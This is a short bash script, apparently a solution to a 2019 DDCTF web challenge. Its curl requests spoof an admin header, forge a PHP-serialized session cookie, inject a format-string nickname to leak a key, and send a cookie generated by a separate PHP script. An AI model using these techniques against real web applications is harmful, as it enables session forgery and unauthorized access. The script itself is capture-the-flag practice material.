#!/usr/bin/env bash

# Author : Virink <virink@outlook.com>
# Date   : 2019/04/12, 15:23

# Auth
# curl 'http://117.51.158.44/app/Auth.php' -H 'didictf_username: admin' -X POST
# curl -s 'http://117.51.158.44/app/Session.php' -H 'didictf_username: admin' -X POST

echo 
echo 
# Get Key
curl -s 'http://117.51.158.44/app/Session.php' \
    -H 'didictf_username: admin' \
    -H 'User-Agent: shr' \
    -H 'Cookie: ddctf_id=a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22b35e7893e8aff367e00c0956440c5b91%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A15%3A%22111.204.236.208%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A3%3A%22shr%22%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D2cce3653e3bbfe077bc3c4d1912ccb0c; expires=Fri, 12-Apr-2019 08:48:17 GMT; Max-Age=7200' \
    -X POST \
    -d 'nickname=key is >> %s <<'


echo 
echo 

curl -s 'http://117.51.158.44/app/Session.php' \
    -H 'didictf_username: admin' \
    -H 'User-Agent: shr' \
    -H "Cookie: ddctf_id=$(php web2.php); expires=Fri, 12-Apr-2019 08:48:17 GMT; Max-Age=7200" \
    -X POST